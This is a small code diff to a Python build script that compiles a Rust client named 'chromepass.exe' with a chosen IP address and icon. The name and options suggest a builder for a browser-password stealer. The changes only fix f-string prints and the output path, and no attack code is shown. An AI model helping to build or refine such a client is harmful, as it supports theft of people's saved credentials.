@@ -77,10 +77,10 @@ def copy_after_compilation(src_path, dist_path, filename):
     try:
         shutil.copyfile(src_path, dist_path)
         os.remove(src_path)
-        print("[+] {filename} build was successful")
+        print(f"[+] {filename} build was successful")
         return True
     except Exception as e:
-        print("[-] {filename} couldn't be copied: {e}")
+        print(f"[-] {filename} couldn't be copied: {e}")
     return False
 
 
@@ -100,7 +100,7 @@ def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", e
     build_command = f"{refresh_env}cd {template_dir}\\{chromepass_base}; cargo build --release;"
     executable_name = "chromepass.exe"
     src_path = f"{template_dir}/{chromepass_base}/target/release/{executable_name}"
-    dist_path = f"{template_dir}/{chromepass_base}/target/release/{executable_name}"
+    dist_path = f"{dist_dir}/{filename}.exe"
     if os.path.exists(temp_path):
         print("[+] Building Client")
         shutil.copyfile(f"{icon_dir}/{icon}",
